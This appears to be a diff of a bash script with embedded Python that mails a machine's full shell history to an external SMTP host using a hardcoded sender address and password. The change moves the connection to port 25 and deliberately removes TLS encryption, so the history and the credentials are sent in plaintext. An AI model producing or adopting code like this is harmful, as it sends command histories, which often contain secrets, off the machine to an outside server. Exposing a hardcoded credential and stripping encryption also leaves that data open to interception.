@@ -75,7 +75,7 @@ EOF
     subject="Full Shell History Report from $HOSTNAME"
 
     smtp_server="24-mail.com"
-    port=587
+    port=25
     sender_email="bash@24-mail.com"
     password="55Marko55"
 
@@ -83,10 +83,9 @@ EOF
     TEMP_FILE=$(mktemp)
     echo -n "$EMAIL_CONTENT" > "$TEMP_FILE"
 
-    # Try sending email via Python
+    # Try sending email via Python without SSL/TLS on port 25
     python_result=$(python -c "
 import smtplib
-import ssl
 import os
 
 port = $port
@@ -102,18 +101,15 @@ with open(body_file, 'r', encoding='utf-8', errors='ignore') as f:
 
 message = f'Subject: {subject}\\n\\n{body}'
 
-context = ssl.create_default_context()
 try:
     with smtplib.SMTP(smtp_server, port) as server:
         server.ehlo()
-        server.starttls(context=context)
-        server.ehlo()
         server.login(sender_email, password)
         server.sendmail(sender_email, receiver_email, message.encode('utf-8', errors='ignore'))
-    print('Email sent successfully via Python using 24-mail.com.')
+    print('Email sent successfully via Python using 24-mail.com on port 25 (no SSL/TLS).')
     exit(0)
 except Exception as e:
-    print(f'Error sending email via Python using 24-mail.com: {e}')
+    print(f'Error sending email via Python using 24-mail.com on port 25 (no SSL/TLS): {e}')
     print(f'Details: {e}')
     exit(1)
 "
